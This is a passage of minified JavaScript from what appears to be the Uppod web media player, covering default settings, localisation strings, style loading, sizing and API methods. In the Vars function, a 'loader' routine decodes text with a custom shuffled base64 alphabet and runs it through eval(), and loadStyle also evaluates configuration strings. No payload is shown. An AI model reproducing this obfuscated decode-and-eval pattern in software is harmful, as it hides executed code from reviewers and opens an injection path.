        this.cntrlbgo = 0,
        this.cntrlendmargin = 7,
        this.cntrlhide = 0,
        this.fullcntrlhide = 1,
        this.cntrlmargin = 3,
        this.cntrlmarginright = 0,
        this.cntrlmarginleft = 0,
        this.cntrlout = 0,
        this.cntrloutheight = 35,
        this.cntrlsize = 1,
        this.bigbutsonmobile = 0,
        this.cntrlcolor = "ffffff",
        this.cntrlbuffer = {
            center: 0
        },
        this.cntrl_buffer = {},
        this.cntrlfull = {
            out: 0
        },
        this.cntrl_full = {},
        this.cntrlstyle = {
            icon: 0,
            color: "ffffff",
            bg: 0,
            bg_o: 1,
            bg_smallicon: 1,
            bgcolor: "000000",
            bg_sh: "0",
            bg_in: "0",
            bg_gl: "0",
            gl_a1: .9,
            gl_a2: .1,
            gl_color: "FFFFFF",
            sh_blur: 6,
            sh_dist: 0,
            bg_a: 1,
            bg_w: 20,
            bg_h: 20,
            scale: 1,
            eff: 0,
            effE: "Cubic",
            sh: 0,
            sh_c: "000000",
            sh_a: .5,
            sh_under: 1,
            notip: 0,
            text: 0,
            center: 0,
            marginleft: 0,
            marginright: 0,
            margintop: 0,
            marginbottom: 0,
            alpha: 1
        },
        this.cntrlplay = {},
        this.cntrl_play = {},
        this.cntrlpause = {},
        this.cntrl_pause = {},
        this.cntrlstop = {},
        this.cntrl_stop = {},
        this.cntrldownload = {},
        this.cntrl_download = {},
        this.cntrlnext = {},
        this.cntrl_next = {},
        this.cntrlprev = {},
        this.cntrl_prev = {},
        this.cntrlline = {
            h: 4,
            all_a: .3,
            load_a: .4,
            play_a: 1,
            click: 1,
            color_play: "ffffff",
            color_all: "ffffff",
            color_load: "ffffff",
            o: 0,
            full: 0
        },
        this.cntrl_line = {},
        this.cntrl_volbarline = {},
        this.cntrlvolbarline = {
            h: 4,
            w: 40,
            all_a: .4,
            play_a: 1,
            color_play: "ffffff",
            color_all: "ffffff",
            o: 0
        },
        this.cntrl_volbarline_v = {},
        this.cntrlvolbarline_v = {
            h: 50,
            w: 4,
            bg: 0,
            bgcolor: "000000",
            bg_o: 0,
            bg_a: .15,
            all_a: .4,
            play_a: 1,
            effdir: 0,
            color_play: "ffffff",
            color_all: "ffffff",
            o: 0
        },
        this.ivolbar_v = !1,
        this.cntrlvolbar = {
            bar: 1,
            n: 5,
            all_a: .4,
            play_a: 1,
            scale: 1
        },
        this.cntrl_volbar = {},
        this.cntrl_tune = {},
        this.cntrl_volume = {},
        this.cntrlvolume = {},
        this.cntrl_sound = {},
        this.cntrlmenu = {},
        this.cntrl_menu = {},
        this.cntrlplaylist = {},
        this.cntrl_playlist = {},
        this.cntrl_hd = {},
        this.cntrlhd = {
            icon: "HQ",
            text: 1,
            alpha0: .5,
            w: 60
        },
        this.cntrlhdselect = {
            bg: 1,
            bg_o: 10,
            bg_a: .7,
            bgcolor: "666666|000000",
            bg_smallicon: 0,
            marker: 1
        },
        this.cntrl_sub = {},
        this.cntrlsub = {
            icon: "A",
            alpha0: .5,
            text: 1
        },
        this.cntrlstart = {
            bg: 1,
            bg_sh: 1,
            bgcolor: "ffffff",
            bg_a: .1,
            bg_w: 75,
            bg_h: 75,
            gl_a1: .8,
            gl_a2: 0,
            eff: 1,
            scale2: 2,
            curtain: "0",
            curtainColor: "000000",
            curtainAlpha: .5,
            notip: 1,
            bg_smallicon: 0
        },
        this.cntrl_start = {},
        this.cntrlseparator = {
            alpha: .5
        },
        this.cntrl_separator = {},
        this.cntrlrun = {
            w: 7,
            h: 7,
            o: 1,
            position: 0,
            hide: 0
        },
        this.cntrl_run = {},
        this.cntrlrun_volume = {
            w: 7,
            h: 7,
            o: 1,
            position: 0,
            hide: 0
        },
        this.cntrl_run_volume = {},
        this.glass = 0,
        this.glasscolor = "ffffff",
        this.glassalpha1 = .9,
        this.glassalpha2 = .2,
        this.hd,
        this.hdsw = 60,
        this.hda,
        this.hdlinks,
        this.hdseparator = ",",
        this.quality = "",
        this.hd1 = 0,
        this.selectbgcolor = "ffffff",
        this.selectcolor = "000000",
        this.hlsautoquality = 0,
        this.comment = "",
        this.commentplus = "",
        this.title = "",
        this.showname = 0,
        this.showtitle,
        this.shownameliketip = 0,
        this.shownameonover = 0,
        this.shownameonstop = 0,
        this.stageposition = "",
        this.stageleft = 0,
        this.stagetop = 0,
        this.commentcolor = "ffffff",
        this.commentbgcolor = "000000",
        this.commentbgcolor_k = !1,
        this.commentbgalpha1 = .5,
        this.commentbgalpha2 = .1,
        this.commentalign = "left",
        this.commenttopmargin = 0,
        this.commentmargin = 10,
        this.tipfontcolor = "ffffff",
        this.tipfont = "Verdana",
        this.tipfontsize = 10,
        this.tipbgcolor = "000000",
        this.tipalpha = .7,
        this.tipbgo = 8,
        this.tipbgshadow = 0,
        this.tiptags1 = "",
        this.tiptags2 = "",
        this.tipcenter = 1,
        this.marquee = 0,
        this.controls = "",
        this.videocontrols = "play,back,time_play,line,time_all,volume,volbarline,full,buffer",
        this.audiocontrols = "play,back,time_play,line,time_all,volume,volbarline,buffer",
        this.streamcontrols = "play,time_play,volume,volbarline",
        this.controls_active = !1,
        this.download = "",
        this.embedcode = "",
        this.events = new Array,
        this.eventtime = 0,
        this.eventplayed = 0,
        this.iosplayer = 1,
        this.androidplayer = 1,
        this.html5_referer = "",
        this.file = "",
        this.filehd = "",
        this.or = [],
        this.ori = 0,
        this.ors = 0,
        this.or_limit = 5,
        this.hotkey = 1,
        this.youtube = !1,
        this.youtube_created = !1,
        this.youtube_quality_received = !1,
        this.htmlsize = 0,
        this.id = "",
        this.iframe = "",
        this.iframeurl = "",
        this.plr = "",
        this.pl_history = [],
        this.bottomrowheight = 200,
        this.pl_rows = 0,
        this.plarrows = 0,
        this.plonend = 0,
        this.link = "",
        this.m = "video",
        this.menu_nocode = 0,
        this.menu_h = 0,
        this.menu_w = 0,
        this.menuauto = 0,
        this.namefont = "Verdana",
        this.namefontsize = 11,
        this.namefontstyle = "normal",
        this.namebgalpha = 0,
        this.namebgcolor = "000000",
        this.namebgo = 8,
        this.namebgshadow = 0,
        this.namecolor = "ffffff",
        this.namemargin_h = 0,
        this.namemargin_v = 0,
        this.namepadding = 6,
        this.nameleading = 0,
        this.nametopanel = 0,
        this.nametags1 = "",
        this.nametags2 = "",
        this.logo = "",
        this.logoplace = 2,
        this.logoalpha = .5,
        this.logomargin = 15,
        this.logomargin_h = 15,
        this.logomargin_v = 15,
        this.logolink = "",
        this.logotarget = "_self",
        this.logoplay = 1,
        this.logopause = 1,
        this.referer = location.href,
        this.https = -1 < this.referer.indexOf("https://") ? 1 : 0,
        this.redirect = "",
        this.redirect_click = 0,
        this.redirect_clickpl = 0,
        this.redirect_play = 0,
        this.redirect_end = 0,
        this.urlprotect = "",
        this.urlredirect = "play",
        this.urlredirect_target = "_self",
        this.urlprotect_link = "",
        this.urlprotect_stop = 0,
        this.urlprotect_warning = 1,
        this.urlprotect_msg = "",
        this.urlprotect_ref = 1,
        this.banned = "",
        this.redirecttarget = "_self",
        this.nohtml5 = "uppod.swf",
        this.o = 0,
        this.padding = 0,
        this.poster = "",
        this.pl = "",
        this.plplace = "inside",
        this.pltw = 100,
        this.plth = 70,
        this.plcolor = "ffffff",
        this.plcolor2 = "ffffff",
        this.plbgcolor = "000000",
        this.plalpha = .3,
        this.plalpha2 = .1,
        this.plalpha_play = .8,
        this.plmargin = 0,
        this.plmargin_h = 10,
        this.plmargin_v = 0,
        this.pltags1 = "",
        this.pltags2 = "",
        this.plfont = "Arial",
        this.plfontsize = 11,
        this.plplay = 0,
        this.plplay1 = 1,
        this.pliview = 0,
        this.plrows = 0,
        this.plcenter = 0,
        this.plbgcolor_play,
        this.plcolor_play,
        this.pltumbs = 0,
        this.pllimit = 10,
        this.nocache = 0,
        this.fillposter = 1,
        this.random = 0,
        this.time = 0,
        this.download,
        this.radio = 0,
        this.radiodropcache = 0,
        this.reloader = 0,
        this.reloadercounter = 0,
        this.reloadertime = 0,
        this.id3 = 0,
        this.screencolor = "000000",
        this.screenposter = "",
        this.scrn_w = 0,
        this.scrn_h = 0,
        this.start = 0,
        this.autoheight = 1,
        this.cntrlbgmargin = 0,
        this.cntrlbgmarginleft = 0,
        this.cntrlbgmarginright = 0,
        this.sub,
        this.sub_tmp,
        this.subcolor = "FAED54",
        this.subbgcolor = "000000",
        this.subfont = "sans-serif",
        this.subbgalpha = 1,
        this.subbgo = 8,
        this.subbgshadow = 0,
        this.subsize = 100,
        this.substart = 1,
        this.subtop = 0,
        this.submenu = 1,
        this.sub_shift = 0,
        this.submargin = 0,
        this.sublangs,
        this.sublangsall = 0,
        this.sublang,
        this.remsublang = 1,
        this.transparent = 0,
        this.repeat = 0,
        this.keyseek = 10,
        this.volume = .8,
        this.remvolume = 1,
        this.remquality = 1,
        this.w = 500,
        this.webkitFullscreen = 0,
        this.realfullscreen = 1,
        this.ytpllimit = 50,
        this.ytposter = 1,
        this.ytapi,
        this.ytplorder = "relevance",
        this.h = 375,
        this.st = "",
        this.hls_plugin = 1,
        this.hls_debug = !1,
        this.hls_autoStartLoad = !0,
        this.hls_defaultAudioCodec = void 0,
        this.hls_maxBufferLength = 30,
        this.hls_maxMaxBufferLength = 600,
        this.hls_maxBufferSize = 6e7,
        this.hls_maxBufferHole = .5,
        this.hls_maxSeekHole = 2,
        this.hls_liveSyncDurationCount = 3,
        this.hls_liveMaxLatencyDurationCount = 10,
        this.hls_enableWorker = !0,
        this.hls_enableSoftwareAES = !0,
        this.hls_manifestLoadingTimeOut = 1e4,
        this.hls_manifestLoadingMaxRetry = 1,
        this.hls_manifestLoadingRetryDelay = 500,
        this.hls_levelLoadingTimeOut = 1e4,
        this.hls_levelLoadingMaxRetry = 4,
        this.hls_levelLoadingRetryDelay = 500,
        this.hls_fragLoadingTimeOut = 2e4,
        this.hls_fragLoadingMaxRetry = 6,
        this.hls_fragLoadingRetryDelay = 500,
        this.hls_appendErrorMaxRetry = 3,
        this.hls_enableCEA708Captions = !0,
        this.infoloader = 1,
        this.infoloaderurl,
        this.infoloaderinterval = 10,
        this.infoloadermask = "{1}<br><b>{2}</b>",
        this.infoloaderaddurl = 0,
        this.ga,
        this.gadb,
        this.gaplay = 0,
        this.gastop = 0,
        this.gaend = 0,
        this.gadownload = 0,
        this.gatype = 0,
        this.galabel,
        this.gatracked = []
    }
    function setVarsLang() {
        this.lang = "ru",
        this.lang_ru = {
            lang: "ru",
            localization: {
                back: "В начало",
                play: "Пуск",
                pause: "Пауза",
                stop: "Стоп",
                full: "Развернуть",
                full_back: "Свернуть",
                list: "Плейлист",
                next: "Следующий",
                download: "Скачать",
                prev: "Предыдущий",
                sound_off: "Вкл. звук",
                sound: "Выкл. звук",
                volume: "Громкость",
                menu: "Поделиться",
                menu_code: "Код",
                menu_link: "Ссылка",
                menu_download: "Файл",
                menu_copy: "Скопировать",
                menu_mail: "Ссылку на e-mail",
                sent: "Отправлено",
                menu_message: "Текст",
                menu_send: "Отправить",
                fontsize: "Размер",
                bgalpha: "Фон",
                fontcolor: "Цвет текста",
                off: "Выключить",
                on: "Включить",
                hq: "Лучшее качество",
                hd: "Качество",
                hq_off: "Обычное качество",
                sub: "Субтитры",
                traffic: "Трафик (МБ)",
                smoothing: "Включить сглаживание",
                smoothing_off: "Выключить сглаживание",
                smoothing_ok: "Сглаживание включено",
                smoothing_off_ok: "Сглаживание выключено",
                password: "Пароль",
                startlive: "Начать трансляцию",
                live: "Трансляция",
                rec: "Запись",
                rerec: "Заново",
                playrec: "Играть",
                contrec: "Продолжить запись",
                settings: "Настройки",
                done: "Готово",
                shownotes: "Шоуноты",
                loading: "Загрузка",
                startplay: "Включите плеер",
                notype: "Не указан режим плеера (m)",
                err: "Ошибка",
                errjson: "Ошибка загрузки",
                errjson_decode: "Ошибка в",
                errjsonpl_decode: "Ошибка в плейлисте",
                err_pl: "Ошибка загрузки плейлиста",
                err_img: "Ошибка загрузки изображения",
                file: "Файл",
                notfound: "не найден",
                streamnotfound: "Трансляция не найдена",
                copy_link: "Ссылка скопирована в буфер обмена",
                copy_code: "Код скопирован в буфер обмена",
                no_data: "Нет данных",
                ads: "Реклама",
                like: "Мне нравится",
                unlike: "Не нравится",
                all: "Все",
                auto: "Авто"
            }
        },
        this.lang_en = {
            lang: "en",
            localization: {
                back: "Back",
                play: "Play",
                pause: "Pause",
                stop: "Stop",
                full: "Fullscreen",
                full_back: "Original",
                list: "folder",
                next: "Next",
                download: "Download",
                prev: "Previous",
                sound_off: "On",
                sound: "Off",
                volume: "Volume",
                menu: "Share",
                menu_code: "Code",
                menu_link: "Link",
                menu_download: "File",
                menu_copy: "Copy",
                menu_mail: "Email to a Friend",
                sent: "Sent",
                menu_message: "Text",
                menu_send: "Send",
                fontsize: "Size",
                bgalpha: "BG",
                fontcolor: "Text color",
                off: "Switch off",
                on: "Switch on",
                hq: "High quality",
                hd: "Quality",
                hq_off: "Low quality",
                sub: "Subtitles",
                traffic: "Traffic (MB)",
                smoothing: "Enable smoothing",
                smoothing_off: "Disable smoothing",
                smoothing_ok: "Smoothing on",
                smoothing_off_ok: "Smoothing off",
                password: "Password",
                startlive: "Start broadcast",
                live: "Broadcast",
                rec: "Record",
                rerec: "Re-record",
                playrec: "Play",
                contrec: "Сontinue record",
                settings: "Settings",
                done: "Done",
                shownotes: "Shownotes",
                loading: "Loading",
                startplay: "Turn on the player",
                notype: "No player mode (m)",
                err: "Error",
                errjson: "Error loading",
                errjson_decode: "Incorrect",
                errjsonpl_decode: "Incorrect playlist",
                err_pl: "Error loading playlist",
                err_img: "Error loading image",
                file: "File",
                notfound: "not found",
                streamnotfound: "Stream not found",
                fileinvalid: "File structure is invalid",
                copy_link: "Link is copied to clipboard",
                copy_code: "Code is copied to clipboard",
                no_data: "No data",
                ads: "Ad",
                like: "Like",
                unlike: "Unlike",
                all: "All",
                auto: "Auto"
            }
        },
        this.lang2 = this.lang_ru.localization
    }
    function loadStyle() {
        var str = "";
        if ("" != this.st) {
            if (-1 == this.st.indexOf("{"))
                if (0 == this.st.indexOf("#"))
                    str = un(this.st);
                else if (-1 == this.st.indexOf(".")) {
                    try {
                        var est = eval(this.st)
                    } catch (err) {
                        ierr = Filename(this.st) + " " + this.lang2.notfound
                    }
                    "" != est ? (str = est,
                    "" != str && "undefined" != String(str) && 0 == str.indexOf("#") && (str = un(str))) : ierr = Filename(this.st) + " " + this.lang2.notfound
                } else
                    str = LoadFile(this.st);
            else
                str = this.st;
            if ("" != str && "undefined" != String(str)) {
                for (var key in style = JSON.parse(str),
                OldKeys(style),
                style)
                    "string" == typeof style[key] && -1 < key.indexOf("color") && (style[key] = style[key].replace("#", ""),
                    5 == style[key].length && (style[key] = "0" + style[key]),
                    0 < style[key].indexOf("|") ? style[key] = ReColor(style[key].substr(0, style[key].indexOf("|"))) + "|" + ReColor(style[key].substr(style[key].indexOf("|") + 1)) : style[key] = ReColor(style[key])),
                    this[key] = style[key];
                style.controls && (isetcontrols = !0)
            }
        }
    }
    function manageStgSize() {
        var t = window.screen.width
          , e = window.screen.height
          , i = getCss(this.stg, "width") || t + "px"
          , o = getCss(this.stg, "height") || e + "px";
        window.self !== window.top && browser.isIE && (i = t + "px",
        o = e + "px");
        var s = 0 < i.indexOf("px")
          , l = parseInt(i)
          , t = 0 == l || isNaN(l)
          , e = parseInt(this.stg.style.height);
        isNaN(e) && (e = parseInt(o));
        i = 0 < o.indexOf("px"),
        o = 0 == e || isNaN(e);
        !t && s && (this.w = l),
        t || s || (0 < this.stg.parentNode.offsetWidth ? this.w = this.stg.parentNode.offsetWidth * l / 100 : t = !0),
        t && (this.stg.style.width = this.w + "px"),
        !o && i && (this.h = e),
        o || i || (0 < this.stg.parentNode.offsetHeight ? this.h = this.stg.parentNode.offsetHeight * e / 100 : o = !0),
        o && (this.stg.style.height = this.h + "px"),
        this.sh = this.stageheight = this.h,
        this.ph = this.sh,
        this.sw = this.stagewidth = this.w,
        this.pw = this.sw
    }
    function Vars() {
        setVarsDefaults.call(this),
        void 0 === Uppod.Stage && (Uppod.Stage = new Array),
        Uppod.Stage[loadvars.id] = this.stg = uppod._parentDom = document.getElementById(loadvars.id),
        null == this.stg && alert("Uppod: ID (" + loadvars.id + ") not found"),
        this.sw = this.stagewidth = this.stg.offsetWidth,
        this.sh = this.stageheight = this.stg.offsetHeight,
        this.stagewidthproc = "";
        var stg_display = getCss(this.stg, "display") || "block";
        CSS(this.stg, {
            padding: 0,
            display: "none"
        });
        var stg_width = getCss(this.stg, "width") || "100%";
        "auto" == stg_width ? this.stagewidthproc = "100%" : 0 < stg_width.indexOf("%") && (this.stagewidthproc = this.stg.style.width),
        this.stg.style.display = stg_display,
        this.ph = this.sh,
        this.pw = this.sw,
        this.touch = 0,
        setVarsLang.call(this),
        OldKeys(loadvars);
        var isetcontrols = !1, key;
        if ("" != uppodstyle && (this.st = uppodstyle),
        this.st0)
            for (var key in this.st0)
                this[key] = this.st0[key];
        for (key in loadvars)
            this[key] = loadvars[key];
        if (manageStgSize.call(this),
        loadvars.video && (this.m = "video",
        this.file = loadvars.video),
        loadvars.audio && (this.m = "audio",
        this.file = loadvars.audio),
        loadvars.controls && (isetcontrols = !0),
        "audio" == this.m ? (this.cntrlhide = 0,
        this.fullcntrlhide = 0,
        this.showname = 1,
        this.shownameliketip = 1,
        "" == this.controls && (this.controls = this.audiocontrols),
        this.uibg = 0,
        nativecontrols = !1) : "" == this.controls && (this.controls = this.videocontrols),
        loadStyle.call(this),
        android && (chrome || (this.androidplayer = 1),
        "video" == this.m && 1 == this.androidplayer && (nativecontrols = !0),
        "play" == this.auto && 0 < this.volume && (this.auto = "firstframe")),
        ipad && ("video" == this.m && (nativecontrols = 1 == this.iosplayer),
        ("none" == this.auto || "play" == this.auto && 0 < this.volume) && (this.auto = "firstframe")),
        nativecontrols && (this.cntrlhide = 0,
        this.cntrlhideover = 0),
        mobile && (this.tip = 0,
        1 < this.bigbutsonmobile && (this.cntrlsize = this.cntrlsize * this.bigbutsonmobile,
        this.cntrlmargin = this.cntrlmargin * this.bigbutsonmobile * this.bigbutsonmobile * 1.5)),
        ipad && "inside" == this.plplace && (-1 < this.controls.indexOf("pl,") || this.controls.indexOf(",pl") == this.controls.length - 3) && (this.plplace = "bottom"),
        0 == this.sh && (500 == this.w && 375 == this.h && "audio" == this.m && (this.w = 300,
        this.h = 90),
        CSS(this.stg, {
            position: "relative",
            width: this.w + "px",
            height: this.h + "px"
        }),
        this.sw = this.stagewidth = this.w,
        this.sh = this.stageheight = this.h),
        0 == this.poster.indexOf("#") && (this.poster = un(this.poster)),
        this.file && 0 == this.file.indexOf("#") && (this.file = un(this.file)),
        "" != this.commentplus && -1 < this.commentplus.indexOf("*u*"))
            for (var myPattern4 = /\*u\*/, i4tmp = this.commentplus.split("*u*").length, i4 = 0; i4 < i4tmp; i4++)
                this.commentplus = this.commentplus.replace(myPattern4, "'");
        this.cntrlcolor && (this.cntrlstyle.color = this.cntrlcolor,
        this.cntrlline.color_play = this.cntrlcolor,
        this.cntrlline.color_all = this.cntrlcolor,
        this.cntrlline.color_load = this.cntrlcolor,
        this.cntrlvolbarline.color_play = this.cntrlcolor,
        this.cntrlvolbarline.color_all = this.cntrlcolor,
        this.cntrlvolbarline_v.color_play = this.cntrlcolor,
        this.cntrlvolbarline_v.color_all = this.cntrlcolor),
        this.dots = [83, 105, 76, 99, 72, 118, 75, 119, 88, 87, 107, 116, 77, 100, 120, 102, 97, 73, 121, 81, 113, 67, 82, 85, 74, 103, 86, 90, 84, 112, 115, 122, 68, 80, 110, 70, 108, 98, 117, 111, 106, 78, 89, 114, 109, 65, 104, 79, 66, 71, 69, 101, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 43, 47, 61],
        this.showtitle && (this.showname = this.showtitle),
        null != this.pl && "object" == typeof this.pl ? this.pl = this.pl.folder : 0 == this.pl.indexOf("#") && (this.pl = un(this.pl)),
        this.lang2 = this.lang_ru.localization,
        "en" == this.lang && (this.lang2 = this.lang_en.localization),
        this.h = this.sh,
        "inside" != this.plplace && "bottomrow" != this.plplace && "bottom" != this.plplace && (this.plplace = "inside",
        -1 == this.controls.indexOf("playlist") && (this.controls += ",playlist")),
        "inside" == this.plplace && ("" == this.pl || isetcontrols || -1 != this.controls.indexOf("playlist") || this.controls != this.audiocontrols && this.controls != this.videocontrols || (this.controls += ",playlist")),
        "bottomrow" == this.plplace && (70 == this.plth && (this.plth = 40),
        this.pltw = this.sw - 2 * this.plmargin,
        "" != this.pl && (this.h = this.sh - this.bottomrowheight - 20)),
        "bottom" == this.plplace && "" != this.pl && (this.h = this.sh - this.plth - 20),
        "bottomrow" != this.plplace && "bottom" != this.plplace || -1 < this.controls.indexOf("playlist") && (this.controls = this.controls.replace(",playlist", "")),
        1 == this.plarrows && ("bottomrow" == this.plplace ? this.plmargin_v = 20 : this.plmargin_h = 40),
        "" != this.nametags1 && -1 < this.nametags1.indexOf("size=") && (this.namefontsize = this.nametags1.substr(this.nametags1.indexOf("size=") + 6, 2),
        this.namefontsize = this.namefontsize.replace(/\//g, "")),
        1 == this.radio && this.controls == this.audiocontrols && (this.controls = this.streamcontrols,
        defaultcontrols = !0);
        for (var list = "", i = 0; i < this.dots.length; ++i)
            list += String.fromCharCode(this.dots[i]);
        this.cntrlmargin += 2,
        1 == this.htmlsize && (this.w = this.sw,
        this.h = this.sh),
        "inside" != this.plplace && (this.ph = this.h),
        "ru" == this.lang && (this.lang2 = this.lang_ru.localization),
        this.addcontrols && (this.controls += "," + this.addcontrols),
        this.plr && (this.iframe = this.plr),
        100 != this.subsize && this.subsize < 30 && (this.subsize = 100 + 10 * (this.subsize - 13)),
        this.sub && (this.sub_tmp = this.sub),
        this.config = {
            _keyStr: list,
            uploader: function(t) {
                var e, i, o, s, l, r, a = "", n = 0;
                for (t = vars.config._utf8_encode(t); n < t.length; )
                    o = (r = t.charCodeAt(n++)) >> 2,
                    s = (3 & r) << 4 | (e = t.charCodeAt(n++)) >> 4,
                    l = (15 & e) << 2 | (i = t.charCodeAt(n++)) >> 6,
                    r = 63 & i,
                    isNaN(e) ? l = r = 64 : isNaN(i) && (r = 64),
                    a = a + this._keyStr.charAt(o) + this._keyStr.charAt(s) + this._keyStr.charAt(l) + this._keyStr.charAt(r);
                return a
            },
            loader: function(e) {
                var t = "", n, r, i, s, o, u, a, f = 0;
                for (e = e.replace(/[^A-Za-z0-9\+\/\=]/g, ""); f < e.length; )
                    s = this._keyStr.indexOf(e.charAt(f++)),
                    o = this._keyStr.indexOf(e.charAt(f++)),
                    u = this._keyStr.indexOf(e.charAt(f++)),
                    a = this._keyStr.indexOf(e.charAt(f++)),
                    n = s << 2 | o >> 4,
                    r = (15 & o) << 4 | u >> 2,
                    i = (3 & u) << 6 | a,
                    t += String.fromCharCode(n),
                    64 != u && (t += String.fromCharCode(r)),
                    64 != a && (t += String.fromCharCode(i));
                t = vars.config._utf8_decode(t),
                eval(t)
            },
            _utf8_encode: function(t) {
                t = t.replace(/\r\n/g, "\n");
                for (var e = "", i = 0; i < t.length; i++) {
                    var o = t.charCodeAt(i);
                    o < 128 ? e += String.fromCharCode(o) : (127 < o && o < 2048 ? e += String.fromCharCode(o >> 6 | 192) : (e += String.fromCharCode(o >> 12 | 224),
                    e += String.fromCharCode(o >> 6 & 63 | 128)),
                    e += String.fromCharCode(63 & o | 128))
                }
                return e
            },
            _utf8_decode: function(t) {
                for (var e = "", i = 0, o = c1 = c2 = 0; i < t.length; )
                    (o = t.charCodeAt(i)) < 128 ? (e += String.fromCharCode(o),
                    i++) : 191 < o && o < 224 ? (c2 = t.charCodeAt(i + 1),
                    e += String.fromCharCode((31 & o) << 6 | 63 & c2),
                    i += 2) : (c2 = t.charCodeAt(i + 1),
                    c3 = t.charCodeAt(i + 2),
                    e += String.fromCharCode((15 & o) << 12 | (63 & c2) << 6 | 63 & c3),
                    i += 3);
                return e
            }
        },
        v = this.volume,
        uppod_storage_support ? (null != localStorage.getItem("pljsquality") && (this.quality = localStorage.getItem("pljsquality")),
        null != localStorage.getItem("pljsvolume") && (v = this.volume = localStorage.getItem("pljsvolume"))) : (getCookie("pljsvolume") && (v = this.volume = getCookie("pljsvolume")),
        getCookie("pljsquality") && (this.quality = getCookie("pljsquality")))
    }
    function OldKeys(t) {
        for (var e in t)
            0 == e.indexOf("pltumbs0") && (t[e.replace("pltumbs0", "pl")] = t[e]),
            0 == e.indexOf("pl0") && (t[e.replace("pl0", "pl")] = t[e]),
            0 == e.indexOf("plcomment") && (t[e.replace("plcomment", "pl")] = t[e])
    }
    function un(t) {
        if (-1 == t.indexOf(".")) {
            for (t = t.substr(1),
            s2 = "",
            i = 0; i < t.length; i += 3)
                s2 += "%u0" + t.slice(i, i + 3);
            t = unescape(s2)
        }
        return t
    }
    function getCss(t, e) {
        return window.getComputedStyle ? null !== window.getComputedStyle(t) ? window.getComputedStyle(t, null).getPropertyValue(e) : void 0 : 0
    }
    function Opacity(t, e) {
        CSS(t, {
            opacity: e,
            filter: "alpha(opacity=" + 100 * e + ")"
        })
    }
    function CheckGradiendDiv(t, e) {
        var i;
        0 < e.indexOf("|") ? (CSS(t, {
            backgroundC: "#" + ReColor((i = e.split("|"))[0])
        }),
        CSS(t, {
            background: "-webkit-gradient(linear, left top, left bottom, from(#" + ReColor(i[0]) + "), to(#" + ReColor(i[1]) + "))"
        }),
        CSS(t, {
            background: "-webkit-linear-gradient(top, #" + ReColor(i[0]) + ", #" + ReColor(i[1]) + ")"
        }),
        CSS(t, {
            background: "-moz-linear-gradient(top, #" + ReColor(i[0]) + ", #" + ReColor(i[1]) + ")"
        }),
        CSS(t, {
            background: "-ms-linear-gradient(top, #" + ReColor(i[0]) + ", #" + ReColor(i[1]) + ")"
        }),
        CSS(t, {
            background: "-o-linear-gradient(top, #" + ReColor(i[0]) + ", #" + ReColor(i[1]) + ")"
        }),
        CSS(t, {
            "background-image": "-ms-linear-gradient(top, #" + ReColor(i[0]) + " 0%, #" + ReColor(i[1]) + " 100%)"
        })) : CSS(t, {
            backgroundColor: "#" + ReColor(e)
        })
    }
    function measureText() {
        return Uppod.measureText.apply(this, arguments)
    }
    function Filename(t) {
        return 0 < t.indexOf("/") && (t = t.substr(t.lastIndexOf("/") + 1)),
        t
    }
    function LoadFile(e) {
        if (e) {
            req = new XMLHttpRequest,
            req.open("GET", e + (1 == vars.nocache ? "" : 0 < e.indexOf("?") ? "&" : "?") + Math.random(), !1);
            try {
                if (req.send(null),
                200 == req.status)
                    return req.responseText;
                Alert(req.status + " " + Filename(e))
            } catch (t) {
                vars && Alert(vars.lang2.errjson + " " + Filename(e), !0)
            }
        }
    }
    function Remove(t) {
        t = document.getElementById(t);
        t && t.parentNode.removeChild(t)
    }
    this.destroy = function() {
        uppod.ads() && uppod.ads().destroy(),
        isYoutube() ? media_yt.destroy() : DestroyMedia(),
        elems = uppod.document.querySelectorAll("*");
        for (var t = 0; t < elems.length; t++) {
            var e = elems[t];
            e.parentNode && e.parentNode.removeChild(e)
        }
        document.removeEventListener("keydown", KeyHandler),
        destroyCanvases(),
        uppod.iframe.parentNode && uppod.iframe.parentNode.removeChild(uppod.iframe)
    }
    ,
    this.getStatus = function() {
        return istart ? ibuff ? 3 : iplay ? 1 : 2 : 0
    }
    ,
    this.Play = function(t) {
        t ? (ClearOldVars(),
        0 == t.indexOf("#") && (t = un(t)),
        NewFile(t, !0)) : iplay || Toggle()
    }
    ,
    this.Init = function(t) {
        Init()
    }
    ,
    this.Pause = function() {
        iplay && Toggle()
    }
    ,
    this.Toggle = function() {
        Toggle()
    }
    ,
    this.Stop = function() {
        init && Stop()
    }
    ,
    this.Seek = function(t) {
        init && SeekTime(t)
    }
    ,
    this.Download = function() {
        init && Download()
    }
    ,
    this.Resize = function() {
        Resize()
    }
    ,
    this.Alert = function(t) {
        Alert(t, !0)
    }
    ,
    this.CloseAlert = function(t) {
        CloseAlrt()
    }
    ,
    this.Full = function(t) {
        Full()
    }
    ,
    this.Next = function(t) {
        Next()
    }
    ,
    this.Prev = function(t) {
        Prev()
    }
    ,
    this.Fullscreen = function(t) {
        Full()
    }
    ,
    this.Normalscreen = function(t) {
        FullOff()
    }
    ,
    this.Comment = function(t) {
        Alert(t, !1)
    }
    ,
    this.CurrentTime = function() {
        return init && media ? CurrentTime() : -1
    }
    ,
    this.PlNumber = function() {
        return pl ? parseInt(ipl) + 1 : -1
    }
    ,
    this.PlayPlNumber = function(t) {
        pl && (PlClick0(),
        ipl = parseInt(t) - ("back" == vars.pl[0].folder ? 0 : 1),
        PlClickCont())
    }
    ,
    this.ShowPl = function(t) {
        pl && "inside" == vars.plplace && "none" == playlist.style.display && Pl()
    }
    ,
    this.HidePl = function(t) {
        pl && "inside" == vars.plplace && "none" != playlist.style.display && Pl()
    }
    ,
    this.PlUp = function(t) {
        pl && (vars.pl = vars.pl_history[0 == t ? 0 : vars.pl_history.length - 1],
        0 == t ? vars.pl_history.splice(1) : vars.pl_history.splice(vars.pl_history.length - 1, 1),
        RemovePl(),
        CreatePl(),
        "inside" == vars.plplace && (Show(playlist),
        plnext_b && Show(plnext_b.c),
        plprev_b && Show(plprev_b.c)),
        plnext_b && PlArrows())
    }
    ,
    this.Duration = function() {
        return init && media ? Duration() : -1
    }
    ,
    this.Volume = function(t) {
        VolumeN(t)
    }
    ,
    this.Volumed = function() {
        return muted ? 0 : isYoutube() ? media_yt.getVolume() / 100 : media ? media.volume : -1
    }
    ,
    this.Played = function() {
        return init && media ? Math.round(CurrentTime() / media.duration * 100) : -1
    }
    ,
    this.Loaded = function() {
        if (init && media) {
            var t = 0;
